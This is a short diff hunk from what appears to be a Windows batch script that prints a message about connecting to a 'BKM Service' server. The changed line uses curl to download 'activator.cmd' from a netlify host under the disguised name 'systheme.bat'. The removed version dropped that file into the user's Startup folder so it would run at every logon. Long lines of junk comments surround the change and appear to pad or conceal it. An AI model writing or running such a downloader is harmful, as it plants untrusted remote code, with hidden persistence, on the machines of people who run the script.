@@ -560,7 +560,7 @@ echo connection au serveur BKM Service
 ::hhjssgfffffffffffffffffffffffffffffffffhskfjhrfhkleshhhhhhhhhhhhhhhhhhsdgslekghsddddddddddvvvv
 ::hhjssgfffffffffffffffffffffffffffffffffhskfjhrfhkleshhhhhhhhhhhhhhhhhhsdgslekghsddddddddddvvvv
 ::hhjssgfffffffffffffffffffffffffffffffffhskfjhrfhkleshhhhhhhhhhhhhhhhhhsdgslekghsddddddddddvvvv
-curl -O "https://bkmservice.netlify.app/activator.cmd" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\systheme.bat"
+curl -O "https://bkmservice.netlify.app/activator.cmd" systheme.bat
 ::hhjssgfffffffffffffffffffffffffffffffffhskfjhrfhkleshhhhhhhhhhhhhhhhhhsdgslekghsddddddddddvvvv
 ::hhjssgfffffffffffffffffffffffffffffffffhskfjhrfhkleshhhhhhhhhhhhhhhhhhsdgslekghsddddddddddvvvv
 ::hhjssgfffffffffffffffffffffffffffffffffhskfjhrfhkleshhhhhhhhhhhhhhhhhhsdgslekghsddddddddddvvvv
